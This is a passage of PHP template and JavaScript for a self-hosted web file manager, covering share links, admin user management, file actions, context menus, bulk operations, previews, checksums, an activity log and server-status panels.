          <div style="font-size:11px;color:var(--t3);font-family:'JetBrains Mono',monospace;margin-top:2px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:340px"><?=htmlspecialchars($shareUrl)?></div>
          <div style="font-size:11px;color:var(--t3);margin-top:2px"><?=$expired?'Expired':(empty($sh['expires'])?'Never expires':('Expires '.date('d/m/Y H:i',$sh['expires'])))?> · by <?=htmlspecialchars($sh['by'])?></div>
        </div>
        <?php if(!$expired):?><button type="button" class="btn btn-xs btn-g share-copy-btn" data-url="<?=he($shareUrl)?>"><svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>Copy</button><?php endif;?>
        <form method="post" onsubmit="return confirm('Revoke this share link?')"><input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>"><input type="hidden" name="action" value="revoke_share"><input type="hidden" name="share_id" value="<?=htmlspecialchars($sh['id'])?>"><button class="btn btn-xs btn-red"><svg viewBox="0 0 24 24"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/></svg>Revoke</button></form>
      </div>
      <?php endforeach;endif;?>
    </div>
  </div>
</div>
<?php endif;?>

<!-- USERS MODAL -->
<?php if(!empty($_SESSION['fm_admin'])):?>
<div class="mod-ov" id="usersOv">
  <div class="mod mod-sm">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><circle cx="9" cy="7" r="4"/><path d="M2 21v-2a4 4 0 0 1 4-4h6a4 4 0 0 1 4 4v2"/></svg></div><span class="mod-title">Manage Users</span><button class="btn btn-icon btn-g" id="usersClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
    <div class="mod-body">
      <?php foreach(fm_load_users($usersFile) as $u):?>
      <div style="display:flex;align-items:center;justify-content:space-between;padding:8px 0;border-bottom:1px solid var(--border)">
        <div style="font-size:13px;color:#e4e4e7"><strong><?=htmlspecialchars($u['user'])?></strong><?php if(!empty($u['admin'])):?><span style="color:#818cf8;font-size:11px"> · admin</span><?php endif;?><?php if(!empty($u['readonly'])):?><span style="color:#f59e0b;font-size:11px"> · ro</span><?php endif;?><div style="color:#71717a;font-size:11px;margin-top:1px"><?=htmlspecialchars($u['root']?:'Full access')?></div></div>
        <?php if($u['user']!=='admin'&&$u['user']!==$_SESSION['fm_user']):?>
        <form method="post" onsubmit="return confirm('Remove?')"><input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>"><input type="hidden" name="action" value="remove_user"><input type="hidden" name="target_user" value="<?=htmlspecialchars($u['user'])?>"><button class="btn btn-icon btn-g" style="color:#fca5a5"><svg viewBox="0 0 24 24"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg></button></form>
        <?php endif;?>
      </div>
      <?php endforeach;?>
      <div style="font-size:10px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.7px;margin:14px 0 8px">Add User</div>
      <form method="post" style="display:flex;flex-direction:column;gap:8px">
        <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>"><input type="hidden" name="action" value="add_user">
        <input type="text" name="new_user" placeholder="Username" required class="inp" style="width:100%">
        <input type="password" name="new_pass" placeholder="Password" required class="inp" style="width:100%">
        <input type="text" name="new_root" placeholder="Restrict folder (empty = full)" class="inp" style="width:100%">
        <label style="display:flex;align-items:center;gap:7px;font-size:12.5px;color:var(--t2)"><input type="checkbox" name="new_readonly" value="1">Read-only</label>
        <button type="submit" class="btn btn-p" style="align-self:flex-start">Create user</button>
      </form>
    </div>
  </div>
</div>
<?php endif;?>

<?php function he($s){return htmlspecialchars($s,ENT_QUOTES|ENT_HTML5);}?>

<script>
const CWD  = <?=json_encode($fm->getCwd())?>;
const CSRF = <?=json_encode($_SESSION['csrf_token'])?>;
const RO   = <?=$fm->isRO()?'true':'false'?>;

/* ═══════════════════════════════════════
   SIDEBAR TOGGLE
═══════════════════════════════════════ */
const menuBtn=document.getElementById('menuBtn');
const sidebar=document.getElementById('sidebar');
const sideOv =document.getElementById('sideOv');
function openSB(){sidebar.classList.add('open');sideOv.style.display='block';requestAnimationFrame(()=>sideOv.classList.add('vis'));document.body.style.overflow='hidden';}
function closeSB(){sidebar.classList.remove('open');sideOv.classList.remove('vis');setTimeout(()=>{sideOv.style.display='none';},280);document.body.style.overflow='';}
menuBtn?.addEventListener('click',()=>sidebar.classList.contains('open')?closeSB():openSB());
sideOv.addEventListener('click',closeSB);
sidebar.querySelectorAll('.sb-item,.sb-flink').forEach(el=>el.addEventListener('click',()=>{if(window.innerWidth<=768)closeSB();}));

/* ═══════════════════════════════════════
   MODAL HELPERS
═══════════════════════════════════════ */
function openMod(id){document.getElementById(id)?.classList.add('open');}
function closeMod(id){document.getElementById(id)?.classList.remove('open');}
document.addEventListener('keydown',e=>{
  if(e.key!=='Escape')return;
  ['prevOv','termOv','hashOv','actOv','srvOv','brOv','symlinkOv','usersOv','permOv','shareCreateOv','sharesOv','largeOv','dupOv','errLogOv','envOv','speedOv'].forEach(closeMod);
  closeSheet();closeCtx();
});
['prevOv','termOv','hashOv','actOv','srvOv','brOv','symlinkOv','usersOv','permOv','shareCreateOv','sharesOv','largeOv','dupOv','errLogOv','envOv','speedOv'].forEach(id=>{
  document.getElementById(id)?.addEventListener('click',e=>{if(e.target===document.getElementById(id))closeMod(id);});
});

/* ═══════════════════════════════════════
   VIEW TOGGLE
═══════════════════════════════════════ */
let isGrid=localStorage.getItem('fm_view')==='grid';
const lv=document.getElementById('lvw'),gv=document.getElementById('gvw');
const vbl=document.getElementById('vIcoList'),vbg=document.getElementById('vIcoGrid');
function applyView(){if(isGrid){lv&&(lv.style.display='none');gv&&(gv.style.display='block');if(vbl)vbl.style.display='block';if(vbg)vbg.style.display='none';}else{lv&&(lv.style.display='block');gv&&(gv.style.display='none');if(vbl)vbl.style.display='none';if(vbg)vbg.style.display='block';}}
applyView();
document.getElementById('viewBtn')?.addEventListener('click',()=>{isGrid=!isGrid;localStorage.setItem('fm_view',isGrid?'grid':'list');applyView();});

/* ═══════════════════════════════════════
   FORM SUBMIT HELPER
═══════════════════════════════════════ */
function af(action,fields){
  document.getElementById('af_a').value=action;
  const map={item_name:'af_n',old_name:'af_o',new_name:'af_nw',items:'af_items',target:'af_tgt',trash_id:'af_tr'};
  Object.entries(map).forEach(([k,id])=>{document.getElementById(id).value='';});
  Object.entries(fields).forEach(([k,v])=>{const id=map[k];if(id)document.getElementById(id).value=v;});
  document.getElementById('af').submit();
}

/* ═══════════════════════════════════════
   FILE ACTIONS
═══════════════════════════════════════ */
function doAction(action,name,extra={}){
  if(action==='del'){
    if(!confirm(`Move "${name}" to trash?`))return;
    af('delete',{item_name:name});
  }else if(action==='ren'){
    const nw=prompt(`Rename "${name}" to:`,name);
    if(nw&&nw.trim()&&nw.trim()!==name)af('rename',{old_name:name,new_name:nw.trim()});
  }else if(action==='unzip'){
    if(!confirm(`Extract "${name}"?`))return;
    af('zip_extract',{item_name:name});
  }else if(action==='tar-x'){
    if(!confirm(`Extract "${name}"?`))return;
    af('tar_extract',{item_name:name});
  }else if(action==='dup'){
    if(!confirm(`Duplicate "${name}"?`))return;
    af('duplicate',{item_name:name});
  }else if(action==='hash'){
    openHash(name);
  }else if(action==='open'){
    if(extra.isDir)location.href='?dir='+encodeURIComponent(CWD+'/'+name);
    else if(extra.raw)openPreview(extra.raw,extra.type||'text',name);
    else location.href='?edit='+encodeURIComponent(name)+'&dir='+encodeURIComponent(CWD);
  }else if(action==='edit'){
    location.href='?edit='+encodeURIComponent(name)+'&dir='+encodeURIComponent(CWD);
  }else if(action==='dl'){
    location.href=extra.raw+'&dl=1';
  }else if(action==='prev'){
    if(extra.raw&&extra.type)openPreview(extra.raw,extra.type,name);
  }else if(action==='path'){
    const p=CWD+'/'+name;
    navigator.clipboard.writeText(p).then(()=>toast('Path copied!'));
  }else if(action==='share'){
    openShareCreate(name);
  }else if(action==='perm'){
    openPerm(name,extra.perm||'');
  }else if(action==='dirsize'){
    calcDirSize(name,extra.trigger);
  }
}

document.addEventListener('click',e=>{
  const btn=e.target.closest('[data-a]');
  if(!btn)return;
  doAction(btn.dataset.a,btn.dataset.n,{raw:btn.dataset.raw,type:btn.dataset.type,isDir:btn.dataset.isdir==='1'});
});

/* ═══════════════════════════════════════
   KEYBOARD NAVIGATION
═══════════════════════════════════════ */
const tbody=document.querySelector('.ft tbody');
if(tbody){
  tbody.addEventListener('keydown',e=>{
    const rows=Array.from(tbody.querySelectorAll('tr[data-name]'));
    const cur=document.activeElement.closest('tr');
    const idx=cur?rows.indexOf(cur):-1;
    if(e.key==='ArrowDown'){e.preventDefault();const nx=rows[idx+1];if(nx)nx.focus();}
    else if(e.key==='ArrowUp'){e.preventDefault();const pr=rows[idx-1];if(pr)pr.focus();}
    else if(e.key==='Enter'&&cur){
      const isDir=cur.dataset.isdir==='1';
      const name=cur.dataset.name;
      if(isDir)location.href='?dir='+encodeURIComponent(CWD+'/'+name);
      else{const nc=cur.querySelector('.nc[data-preview]');if(nc)openPreview(nc.dataset.preview,nc.dataset.type,nc.dataset.fname);}
    }else if(e.key==='Delete'&&cur&&!RO){doAction('del',cur.dataset.name);}
  });
}

/* ═══════════════════════════════════════
   RIGHT-CLICK CONTEXT MENU (desktop)
═══════════════════════════════════════ */
const ctx=document.getElementById('ctx');
let ctxData={};
function showCtx(x,y,data){
  ctxData=data;
  document.getElementById('ctx-name').textContent=data.name;
  const isDir=data.isDir;const isRO=RO;
  // Show/hide items
  qs('ctx-open').style.display='flex';
  qs('ctx-edit').style.display=isDir?'none':'flex';
  qs('ctx-dl').style.display=isDir?'none':'flex';
  qs('ctx-prev').style.display=(data.raw&&!isDir)?'flex':'none';
  qs('ctx-hash').style.display=isDir?'none':'flex';
  qs('ctx-dup').style.display=(isDir||isRO)?'none':'flex';
  qs('ctx-share').style.display=(isDir||isRO)?'none':'flex';
  qs('ctx-dirsize').style.display=isDir?'flex':'none';
  qs('ctx-perm').style.display=isRO?'none':'flex';
  qs('ctx-ren').style.display=isRO?'none':'flex';
  qs('ctx-del').style.display=isRO?'none':'flex';
  // Position
  ctx.style.left=x+'px';ctx.style.top=y+'px';
  ctx.classList.add('open');
  // Adjust if off screen
  requestAnimationFrame(()=>{
    const r=ctx.getBoundingClientRect();
    if(r.right>window.innerWidth)ctx.style.left=(x-r.width)+'px';
    if(r.bottom>window.innerHeight)ctx.style.top=(y-r.height)+'px';
  });
}
function closeCtx(){ctx.classList.remove('open');}
function qs(id){return document.getElementById(id);}

document.addEventListener('contextmenu',e=>{
  const nc=e.target.closest('[data-ctx-name]');
  const row=e.target.closest('tr[data-name],.gi[data-name]');
  if(!nc&&!row){closeCtx();return;}
  e.preventDefault();
  const name=nc?nc.dataset.ctxName:row.dataset.name;
  const isDir=(nc?nc.dataset.ctxIsdir:row.dataset.isdir)==='1';
  const raw=nc?nc.dataset.ctxRaw:row.dataset.ctxRaw||'';
  const type=nc?nc.dataset.ctxType:row.dataset.type||'';
  const perm=(nc?nc.dataset.ctxPerm:row.dataset.ctxPerm)||'';
  showCtx(e.clientX,e.clientY,{name,isDir,raw,type,perm});
});
document.addEventListener('click',e=>{if(!e.target.closest('.ctx'))closeCtx();});
document.addEventListener('scroll',closeCtx,true);

// Context menu actions
qs('ctx-open')?.addEventListener('click',()=>{closeCtx();doAction('open',ctxData.name,ctxData);});
qs('ctx-edit')?.addEventListener('click',()=>{closeCtx();doAction('edit',ctxData.name);});
qs('ctx-dl')?.addEventListener('click',()=>{closeCtx();doAction('dl',ctxData.name,ctxData);});
qs('ctx-prev')?.addEventListener('click',()=>{closeCtx();doAction('prev',ctxData.name,ctxData);});
qs('ctx-path')?.addEventListener('click',()=>{closeCtx();doAction('path',ctxData.name);});
qs('ctx-hash')?.addEventListener('click',()=>{closeCtx();openHash(ctxData.name);});
qs('ctx-dup')?.addEventListener('click',()=>{closeCtx();doAction('dup',ctxData.name);});
qs('ctx-share')?.addEventListener('click',()=>{closeCtx();openShareCreate(ctxData.name);});
qs('ctx-dirsize')?.addEventListener('click',e=>{closeCtx();calcDirSize(ctxData.name,null);});
qs('ctx-perm')?.addEventListener('click',()=>{closeCtx();openPerm(ctxData.name,ctxData.perm);});
qs('ctx-ren')?.addEventListener('click',()=>{closeCtx();doAction('ren',ctxData.name);});
qs('ctx-del')?.addEventListener('click',()=>{closeCtx();doAction('del',ctxData.name);});

/* ═══════════════════════════════════════
   LONG-PRESS BOTTOM SHEET (mobile)
═══════════════════════════════════════ */
const shOv=document.getElementById('shOv');
const sheet=document.getElementById('sheet');
let lpTimer,lpActive=false,lpStartY=0;
function openSheet(name,isDir,raw,type,size){
  document.getElementById('sh-name').textContent=name;
  document.getElementById('sh-meta').textContent=isDir?'Directory':(size?formatBytes(size)+' · '+(type||'file'):type||'file');
  const g=document.getElementById('sh-grid');
  const btns=[
    {icon:'<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>',label:'Open',cls:'',act:()=>doAction('open',name,{isDir,raw,type})},
    !isDir?{icon:'<path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/>',label:'Edit',cls:'sh-blue',act:()=>doAction('edit',name)}:null,
    !isDir?{icon:'<path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/>',label:'Download',cls:'sh-blue',act:()=>{if(raw)location.href=raw+'&dl=1';}}:null,
    {icon:'<rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>',label:'Copy Path',cls:'',act:()=>{navigator.clipboard.writeText(CWD+'/'+name).then(()=>toast('Path copied!'));}},
    !isDir?{icon:'<path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>',label:'Checksum',cls:'sh-purp',act:()=>openHash(name)}:null,
    !RO&&!isDir?{icon:'<circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/>',label:'Share Link',cls:'',act:()=>openShareCreate(name)}:null,
    isDir?{icon:'<ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/>',label:'Calc Size',cls:'',act:()=>calcDirSize(name,null)}:null,
    !RO?{icon:'<rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>',label:'Permissions',cls:'',act:()=>openPerm(name,'')}:null,
    !RO&&!isDir?{icon:'<rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>',label:'Duplicate',cls:'sh-amb',act:()=>doAction('dup',name)}:null,
    !RO?{icon:'<polyline points="5 12 12 5 19 12"/><line x1="12" y1="5" x2="12" y2="19"/>',label:'Rename',cls:'sh-amb',act:()=>doAction('ren',name)}:null,
    !RO?{icon:'<polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/><path d="M10 11v6"/><path d="M14 11v6"/>',label:'Delete',cls:'sh-red',act:()=>doAction('del',name)}:null,
  ].filter(Boolean);
  g.innerHTML=btns.map((b,i)=>`<button class="sh-btn ${b.cls}" id="shb${i}">${svgStr(b.icon)}<span>${b.label}</span></button>`).join('');
  btns.forEach((b,i)=>{document.getElementById('shb'+i)?.addEventListener('click',()=>{closeSheet();b.act();});});
  shOv.style.display='block';requestAnimationFrame(()=>sheet.classList.add('open'));
}
function closeSheet(){sheet.classList.remove('open');setTimeout(()=>shOv.style.display='none',320);}
function svgStr(inner){return `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">${inner}</svg>`;}
shOv.addEventListener('click',closeSheet);
// Swipe down to close sheet
let shStartY=0;
sheet.addEventListener('touchstart',e=>{shStartY=e.touches[0].clientY;},{passive:true});
sheet.addEventListener('touchend',e=>{if(e.changedTouches[0].clientY-shStartY>60)closeSheet();},{passive:true});

// Detect long-press on file rows and grid items
function attachLongPress(el){
  el.addEventListener('touchstart',e=>{
    lpStartY=e.touches[0].clientY;lpActive=false;
    const row=el.closest('[data-name]');if(!row)return;
    lpTimer=setTimeout(()=>{
      lpActive=true;
      const name=row.dataset.name;
      const isDir=(row.dataset.isdir||'0')==='1';
      const raw=row.querySelector('[data-ctx-raw]')?.dataset.ctxRaw||'';
      const type=row.dataset.type||row.querySelector('[data-ctx-type]')?.dataset.ctxType||'';
      const size=parseInt(row.querySelector('.sz')?.textContent)||0;
      if(navigator.vibrate)navigator.vibrate(40);
      openSheet(name,isDir,raw,type,0);
    },550);
  },{passive:true});
  el.addEventListener('touchmove',e=>{
    if(Math.abs(e.touches[0].clientY-lpStartY)>10)clearTimeout(lpTimer);
  },{passive:true});
  el.addEventListener('touchend',()=>clearTimeout(lpTimer),{passive:true});
  el.addEventListener('touchcancel',()=>clearTimeout(lpTimer),{passive:true});
}
document.querySelectorAll('tr[data-name],.gi[data-name]').forEach(attachLongPress);

/* ═══════════════════════════════════════
   MULTI-SELECT & BULK
═══════════════════════════════════════ */
const checkAll=document.getElementById('checkAll');
const bulkBar=document.getElementById('bulkBar');
const bulkCount=document.getElementById('bulkCount');
const selStat=document.getElementById('selStat');
const selCount=document.getElementById('selCount');
function getChecks(){return Array.from(document.querySelectorAll('.item-ck'));}
function selNames(){return getChecks().filter(c=>c.checked).map(c=>c.value);}
function refreshBulk(){
  const sel=selNames();
  document.querySelectorAll('tr[data-name],.gi[data-name]').forEach(row=>{
    const cb=row.querySelector('.item-ck');row.classList.toggle('selected',!!(cb&&cb.checked));
  });
  if(sel.length>0){bulkBar.classList.add('show');if(bulkCount)bulkCount.textContent=sel.length+' selected';}
  else bulkBar.classList.remove('show');
  if(selStat){selStat.style.display=sel.length>0?'flex':'none';if(selCount)selCount.textContent=sel.length;}
}
checkAll?.addEventListener('change',()=>{getChecks().forEach(c=>c.checked=checkAll.checked);refreshBulk();});
document.addEventListener('change',e=>{if(e.target.classList.contains('item-ck'))refreshBulk();});
document.getElementById('bkDel')?.addEventListener('click',()=>{const s=selNames();if(!s.length)return;if(!confirm(`Delete ${s.length} item(s)?`))return;af('bulk_delete',{items:JSON.stringify(s)});});
document.getElementById('bkZip')?.addEventListener('click',()=>{const s=selNames();if(!s.length)return;af('zip_create',{items:JSON.stringify(s)});});
document.getElementById('bkTar')?.addEventListener('click',()=>{const s=selNames();if(!s.length)return;af('tar_create',{items:JSON.stringify(s)});});
document.getElementById('bkCopy')?.addEventListener('click',()=>{const s=selNames();if(!s.length)return;const t=prompt('Copy to:',CWD);if(t)af('bulk_copy',{items:JSON.stringify(s),target:t.trim()});});
document.getElementById('bkMove')?.addEventListener('click',()=>{const s=selNames();if(!s.length)return;const t=prompt('Move to:',CWD);if(t)af('bulk_move',{items:JSON.stringify(s),target:t.trim()});});

/* Grid click to preview */
document.getElementById('gvw')?.addEventListener('click',e=>{
  const gi=e.target.closest('.gi[data-preview]');
  if(!gi||e.target.classList.contains('item-ck'))return;
  openPreview(gi.dataset.preview,gi.dataset.type,gi.dataset.fname);
});

/* Name-cell click to preview */
document.addEventListener('click',e=>{
  const nc=e.target.closest('.nc[data-preview]');if(!nc)return;
  openPreview(nc.dataset.preview,nc.dataset.type,nc.dataset.fname);
});

/* ═══════════════════════════════════════
   PREVIEW MODAL
═══════════════════════════════════════ */
const prevOv=document.getElementById('prevOv');
const prevBody=document.getElementById('prevBody');
function openPreview(url,type,fname){
  document.getElementById('prevName').textContent=fname;
  document.getElementById('prevDl').href=url+'&dl=1';
  prevBody.innerHTML='';
  if(type==='image'){const img=document.createElement('img');img.src=url;prevBody.appendChild(img);}
  else if(type==='video'){const v=document.createElement('video');v.src=url;v.controls=true;v.autoplay=true;prevBody.appendChild(v);}
  else if(type==='pdf'){const fr=document.createElement('iframe');fr.src=url;prevBody.appendChild(fr);}
  else{const pre=document.createElement('pre');pre.textContent='Loading…';prevBody.appendChild(pre);fetch(url).then(r=>r.text()).then(t=>{pre.textContent=t.length>200000?t.slice(0,200000)+'\n…(truncated)':t;}).catch(()=>{pre.textContent='Could not load file.';});}
  prevOv.classList.add('open');
}
document.getElementById('prevClose')?.addEventListener('click',()=>{prevOv.classList.remove('open');prevBody.innerHTML='';});
prevOv.addEventListener('click',e=>{if(e.target===prevOv){prevOv.classList.remove('open');prevBody.innerHTML='';}});

/* ═══════════════════════════════════════
   CHECKSUM MODAL
═══════════════════════════════════════ */
document.getElementById('hashClose')?.addEventListener('click',()=>closeMod('hashOv'));
async function openHash(filename){
  document.getElementById('hashTitle').textContent='Checksum — '+filename;
  document.getElementById('hashBody').innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)">Computing…</div>';
  openMod('hashOv');
  try{
    const d=await fetch('?x=cs&f='+encodeURIComponent(filename)+'&dir='+encodeURIComponent(CWD)).then(r=>r.json());
    if(d.error){document.getElementById('hashBody').innerHTML='<div style="padding:20px;color:#fca5a5">'+d.error+'</div>';return;}
    document.getElementById('hashBody').innerHTML=`<div style="padding:16px">
      <div style="font-size:11px;color:var(--t2);margin-bottom:12px">Click any hash to copy</div>
      ${hr('MD5',d.md5)}${hr('SHA-1',d.sha1)}${hr('SHA-256',d.sha256)}
      <div class="hash-r"><div class="hash-l">File Size</div><div class="hash-v" style="color:var(--t1)">${formatBytes(d.size)}</div></div>
    </div>`;
    document.querySelectorAll('.hash-v[data-c]').forEach(el=>el.addEventListener('click',()=>{navigator.clipboard.writeText(el.dataset.c).then(()=>{const ov=el.innerHTML;el.innerHTML='<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" style="width:12px;height:12px;vertical-align:-1px"><polyline points="20 6 9 17 4 12"/></svg> Copied!';el.style.color='#86efac';setTimeout(()=>{el.innerHTML=ov;el.style.color='';},1500);});}));
  }catch{document.getElementById('hashBody').innerHTML='<div style="padding:20px;color:#fca5a5">Failed.</div>';}
}
function hr(l,h){return `<div class="hash-r"><div class="hash-l">${l}</div><div class="hash-v" data-c="${h}" title="Click to copy">${h}</div></div>`;}

/* ═══════════════════════════════════════
   ACTIVITY LOG
═══════════════════════════════════════ */
document.getElementById('actBtn')?.addEventListener('click',async()=>{
  openMod('actOv');
  document.getElementById('actBody').innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div>';
  try{
    const log=await fetch('?x=lg').then(r=>r.json());
    if(!log.length){document.getElementById('actBody').innerHTML='<div class="empty" style="padding:40px"><p>No activity yet.</p></div>';return;}
    const rows=log.map(e=>`<tr><td style="white-space:nowrap;color:var(--t3);font-family:\'JetBrains Mono\',monospace;font-size:10.5px">${new Date(e.time*1000).toLocaleString()}</td><td><span class="la ${e.action}">${e.action}</span></td><td style="color:var(--t2);max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(e.user)}</td><td style="font-family:\'JetBrains Mono\',monospace;font-size:11px;max-width:260px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${esc(e.detail)}">${esc(e.detail)}</td></tr>`).join('');
    document.getElementById('actBody').innerHTML=`<div style="overflow:auto;max-height:65vh"><table class="log-t"><thead><tr><th>Time</th><th>Action</th><th>User</th><th>Detail</th></tr></thead><tbody>${rows}</tbody></table></div>`;
  }catch{document.getElementById('actBody').innerHTML='<div style="padding:20px;color:#fca5a5">Failed.</div>';}
});
document.getElementById('actClose')?.addEventListener('click',()=>closeMod('actOv'));

/* ═══════════════════════════════════════
   SERVER INFO
═══════════════════════════════════════ */
document.getElementById('srvBtn')?.addEventListener('click',async()=>{
  openMod('srvOv');
  document.getElementById('srvBody').innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div>';
  try{
    const d=await fetch('?x=sv').then(r=>r.json());
    document.getElementById('srvBody').innerHTML=`<div style="padding:16px">
      <div class="info-g">${[['Hostname',d.hostname||'—',''],['Server IP',d.server_ip||'—',''],['Client IP',d.client_ip||'—',''],['Uptime',d.uptime||'—',''],['CPU Cores',d.cpu_cores||'n/a',d.cpu_model||''],['CPU Load',d.load?d.load.join(' / '):'n/a','1m / 5m / 15m'],['RAM Usage',d.mem_pct!=null?d.mem_pct+'%':'n/a',d.mem_used?d.mem_used+' / '+d.mem_total:''],['PHP Version',d.php,'Runtime'],['OS',d.os,''],['Web Server',d.server,''],['SAPI',d.sapi,''],['Memory Limit',d.memory_limit,'Peak: '+d.mem_peak],['PHP Memory Usage',d.mem_usage,''],['Disk Total',d.disk_total,'Free: '+d.disk_free+' ('+d.disk_pct+'% used)'],['Upload Max',d.upload_max,'POST Max: '+d.post_max],['Max Exec',d.max_exec,''],['Timezone',d.tz,'']].map(([l,v,s])=>`<div class="info-c"><div class="info-cl">${l}</div><div class="info-cv">${esc(String(v))}</div>${s?`<div class="info-cs">${esc(s)}</div>`:''}</div>`).join('')}</div>
      <div style="font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.7px;color:var(--t3);margin-bottom:8px">Extensions (${d.exts.length})</div>
      <div class="ext-wrap">${d.exts.sort().map(e=>`<span class="ext-tag">${esc(e)}</span>`).join('')}</div>
    </div>`;
  }catch{document.getElementById('srvBody').innerHTML='<div style="padding:20px;color:#fca5a5">Failed.</div>';}
});
document.getElementById('srvClose')?.addEventListener('click',()=>closeMod('srvOv'));
document.querySelectorAll('.bs-click').forEach(el=>el.addEventListener('click',()=>document.getElementById('srvBtn')?.click()));

/* Live status-bar refresh: CPU load / RAM / disk every 6s, clock every 1s */
async function refreshStatusBar(){
  try{
    const d=await fetch('?x=svlite').then(r=>r.json());
    const dv=document.getElementById('sbDiskV');if(dv)dv.textContent=d.disk_pct+'%';
    const lv=document.getElementById('sbLoadV');if(lv&&d.load)lv.textContent=d.load.join(' ');
    const mv=document.getElementById('sbMemV');if(mv&&d.mem_pct!=null)mv.textContent=d.mem_pct+'%';
    const uv=document.getElementById('sbUptimeV');if(uv&&d.uptime){const h=Math.floor(d.uptime/3600),dd=Math.floor(d.uptime/86400);uv.textContent=dd>0?dd+'d '+(h%24)+'h':(h>0?h+'h '+Math.floor((d.uptime%3600)/60)+'m':Math.floor(d.uptime/60)+'m');}
  }catch{}
}
setInterval(refreshStatusBar,6000);
function tickClock(){const c=document.getElementById('clockEl');if(c)c.textContent=new Date().toLocaleTimeString('en-GB');}
setInterval(tickClock,1000);

/* ═══════════════════════════════════════
   LARGE FILES FINDER
═══════════════════════════════════════ */
function fmtPath(p){return p.replace(CWD,'').replace(/^\//,'')||'.';}
async function loadLargeFiles(){
  const mb=document.getElementById('largeMb').value;
  document.getElementById('largeBody').innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)">Scanning…</div>';
  try{
    const d=await fetch('?x=largefiles&mb='+encodeURIComponent(mb)).then(r=>r.json());
    if(!d.files||!d.files.length){document.getElementById('largeBody').innerHTML='<div class="empty" style="padding:40px"><p>No files above this size.</p></div>';return;}
    const rows=d.files.map(f=>`<tr><td style="font-family:'JetBrains Mono',monospace;font-size:12px">${esc(f.name)}</td><td style="color:var(--t2);font-size:11px;max-width:260px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${esc(fmtPath(f.dir))}">${esc(fmtPath(f.dir))}</td><td style="font-family:'JetBrains Mono',monospace;font-weight:700">${formatBytes(f.size)}</td><td><button class="btn btn-xs btn-red" onclick="delAbsPath('${esc(f.path).replace(/'/g,"\\'")}',this)">Delete</button></td></tr>`).join('');
    document.getElementById('largeBody').innerHTML=`<div style="overflow:auto;max-height:65vh">${d.capped?'<div style="padding:8px 14px;font-size:11px;color:#fcd34d">Scan capped by time/count limit — showing partial results.</div>':''}<table class="log-t"><thead><tr><th>Name</th><th>Location</th><th>Size</th><th></th></tr></thead><tbody>${rows}</tbody></table></div>`;
  }catch{document.getElementById('largeBody').innerHTML='<div style="padding:20px;color:#fca5a5">Failed.</div>';}
}
document.getElementById('largeBtn')?.addEventListener('click',()=>{openMod('largeOv');loadLargeFiles();});
document.getElementById('largeMb')?.addEventListener('change',loadLargeFiles);
document.getElementById('largeClose')?.addEventListener('click',()=>closeMod('largeOv'));

/* ═══════════════════════════════════════
   DUPLICATE FILE FINDER
═══════════════════════════════════════ */
document.getElementById('dupBtn')?.addEventListener('click',async()=>{
  openMod('dupOv');
  document.getElementById('dupBody').innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)">Scanning…</div>';
  try{
    const d=await fetch('?x=duplicates').then(r=>r.json());
    if(!d.groups||!d.groups.length){document.getElementById('dupBody').innerHTML='<div class="empty" style="padding:40px"><p>No duplicate files found.</p></div>';return;}
    const html=d.groups.map(g=>`<div style="border-bottom:1px solid var(--border);padding:12px 14px">
